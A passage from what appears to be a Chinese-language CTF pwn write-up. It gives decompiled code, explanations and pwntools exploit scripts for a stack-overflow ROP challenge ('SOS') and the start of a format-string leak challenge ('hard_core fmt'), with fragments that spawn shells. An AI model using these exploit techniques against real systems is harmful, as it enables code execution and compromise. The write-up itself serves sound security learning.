        add(io, "/bin/sh\x00" + p64(system_addr))
        #gdb_attach(io, [])
        m_c(io, 3)
        s_i(io, 1)
        io.interactive()
        exit(0)
    while True:
        try:
            io = get_io(target)
            pwn(io)
        except Exception as e:
            io.close()
### SOS
主要代码：
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      char *v3; // rax
      char cpp_string; // [rsp+10h] [rbp-40h]
      int size; // [rsp+3Ch] [rbp-14h]
      setbuf(stdout, 0LL);
      puts("Welcome to String On the Stack!");
      std::__cxx11::basic_string,std::allocator>::basic_string(&cpp_string);
      puts("Give me the string size: ");
      scanf("%d", &size);
      if ( size  256 )
      {
        puts("Invalid size!");
        exit(-1);
      }
      std::__cxx11::basic_string,std::allocator>::resize(&cpp_string, size);
      puts("Alright, input your SOS code: ");
      v3 = (char *)std::__cxx11::basic_string,std::allocator>::c_str(&cpp_string);
      read_str(v3);
      std::__cxx11::basic_string,std::allocator>::~basic_string(&cpp_string);
      return 0LL;
    }
乍一看似乎没啥问题，但是似乎输入size，没什么卵用啊！在输入的时候size并没有传入进去。  
具体看看`read_str`函数：
    ssize_t __fastcall read_str(char *s)
    {
      ssize_t result; // rax
      char *buf; // [rsp+8h] [rbp-18h]
      buf = s;
      while ( 1 )
      {
        result = read(0, buf, 1uLL);
        if ( !(_DWORD)result )
          break;
        if ( (_DWORD)result == -1 )
        {
          if ( *__errno_location() != 11 )
          {
            result = (unsigned int)*__errno_location();
            if ( (_DWORD)result != 4 )
              return result;
          }
        }
        else
        {
          ++buf;
        }
      }
      return result;
    }
读到read返回0或者read失败（返回-1）结束，否则继续。所以这个地方溢出是肯定的了，因为这个地方完全没有处理size的问题，所以输入个`0`作为size，就可以触发栈溢出了。题目也没有canary，似乎这样很完美嘛。
但是马上问题就来了，这个地方如果要断开，一个方法是使用`p.shutdown`，但是这样的话，read返回0，之后也无法再进行read了，那么`libc`的地址拿不到啊，即使拿到了也无法继续影响整个程序流程了，所以这样比较麻烦，好在根据我们刚才看到的，`read`退出有两种情况，一个是返回0，也就是由于EOF(也就是需要`shutdown`)，另外一种呢？当返回-1的时候也是return，所以可以利用这个。`read`是一个系统调用，当系统调用的目标位置不可写的时候，就会返回-1了，所以可以利用这种方法来达到退出这个函数的目的，之后就比较常规了，puts一下libc地址，然后返回函数开始，然后再来一次就可以正常rop了。
    #! /usr/bin/env python2
    # -*- coding: utf-8 -*-    # vim:fenc=utf-8
    #
    # Copyright © 2018 anciety 
    #
    # Distributed under terms of the MIT license.
    import sys
    import os
    import os.path
    from pwn import *
    context(os='linux', arch='amd64', log_level='debug')
    context.terminal = ['lxterminal', '-e']
    # synonyms for faster typing
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    if len(sys.argv) > 2:
        DEBUG = 0
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        p = remote(HOST, PORT)
    else:
        DEBUG = 1
        if len(sys.argv) == 2:
            PATH = sys.argv[1]
        p = process(PATH)
    libc = ELF('./libc-2.27.so')
    def main():
        # Your exploit script goes here
        pop_rdi_ret = 0x0000000000400c53 # pop rdi ; ret
        pop_rsi_r15_ret = 0x0000000000400c51 # pop rsi ; pop r15 ; ret
        p.ru('size:')
        p.sl(str(0))
        p.ru('code:')
        payload = cyclic(56)
        payload += p64(pop_rdi_ret)
        payload += p64(0x602020)
        payload += p64(0x4008e0)
        payload += p64(0x400afc)
        #gdb.attach(p, 'b *0x400be3')
        p.s(payload)
        while True:
            libc_addr = p.rl(timeout=1).strip()
            p.info('receiving..')
            if len(libc_addr) > 4:
                break
            p.s('0' * 0x1000)
        libc_addr = u64(libc_addr.ljust(8, '\x00'))
        libc_base = libc_addr - libc.symbols['puts']
        p.info('libc_base: 0x%x' % libc_base)
        p.ru('size:')
        p.sl(str(0))
        p.ru('code: ')
        payload = 'a' * 56
        payload += p64(libc_base + 0x4f322)
        p.sl(payload)
        for i in range(3):
            recved = p.rl(timeout=1)
            p.info('sending..')
            if len(recved) > 4:
                break
            p.s('ls;' + '\x00' * 0x1000)
        p.irt()
    if __name__ == '__main__':
        main()
### hard_core fmt
这个题确实比较神奇，根据文档瞎搞搞出来的。  
题目主要代码：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      __int64 v3; // rax
      __int64 v4; // r8
      __int64 v5; // r9
      int vars0; // [rsp+0h] [rbp+0h]
      __int16 vars4; // [rsp+4h] [rbp+4h]
      __int64 anonymous0; // [rsp+8h] [rbp+8h]
      char vars10; // [rsp+10h] [rbp+10h]
      __int64 anonymous1; // [rsp+18h] [rbp+18h]
      __int64 anonymous2; // [rsp+20h] [rbp+20h]
      __int64 anonymous3; // [rsp+28h] [rbp+28h]
      __int64 anonymous4; // [rsp+30h] [rbp+30h]
      __int64 anonymous5; // [rsp+38h] [rbp+38h]
      __int64 anonymous6; // [rsp+40h] [rbp+40h]
      __int64 anonymous7; // [rsp+48h] [rbp+48h]
      unsigned __int64 vars118; // [rsp+118h] [rbp+118h]
      vars118 = __readfsqword(0x28u);
      init();
      puts("Welcome to hard-core fmt");
      vars4 = 0;
      memset(&vars10, 0, 0x100uLL);
      vars0 = 0;
      my_read(&vars0, 11);
      __printf_chk(1LL, (__int64)&vars0, -1LL, -1LL, -1LL, -1LL, -1LL, -1LL, -1LL, -1LL, -1LL, -1LL, -1LL, -1LL, -1LL, -1LL);
      puts("");
      v3 = get_num();
      __printf_chk(
        1LL,
        (__int64)"%p: %s",
        v3,
        v3,
        v4,
        v5,
        *(__int64 *)&vars0,
        anonymous0,
        *(__int64 *)&vars10,
        anonymous1,
        anonymous2,
        anonymous3,
        anonymous4,
        anonymous5,
        anonymous6,
        anonymous7);
      gets(&vars10);
      return 0;
    }
一共有14个`-1`，但是输入只有11个，正常的格式化字符串漏洞，加上有`fortify`保护，是泄露不出来任何东西的。题目的保护情况是保护全开，所以也有PIE，那么之后的任意地址泄露就用不上，因为一个地址都还不知道。
然后开始瞎搞，翻`printf`文档看看有没有什么神奇的specifier，比较冷门的那种，之后就找到了这个：
    a, A   (C99; not in SUSv2, but added in SUSv3) For a conversion, the double argument
                  is converted to hexadecimal notation (using the letters abcdef) in the  style
                  [-]0xh.hhhhp±;  for  A  conversion the prefix 0X, the letters ABCDEF, and the
                  exponent separator P is used.  There is one hexadecimal digit before the dec‐
                  imal point, and the number of digits after it is equal to the precision.  The
                  default precision suffices for an exact representation of  the  value  if  an
                  exact  representation in base 2 exists and otherwise is sufficiently large to
                  distinguish values of type double.  The digit before  the  decimal  point  is
                  unspecified  for nonnormalized numbers, and nonzero but otherwise unspecified
                  for normalized numbers.
其实我也没看懂他啥意思，然后尝试了一下，发现出来了两个地址。。
    Welcome to hard-core fmt
    %a%a%a%a%a
    0x0p+00x0.0000000000001p-10220x0.07ffff7ffe1p-10220x0.07ffff7fed5p-10220x0.0000000000d68p-1022
    pwndbg> vmmap
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x555555554000     0x555555555000 r-xp     1000 0      /pwn/hardcore_fmt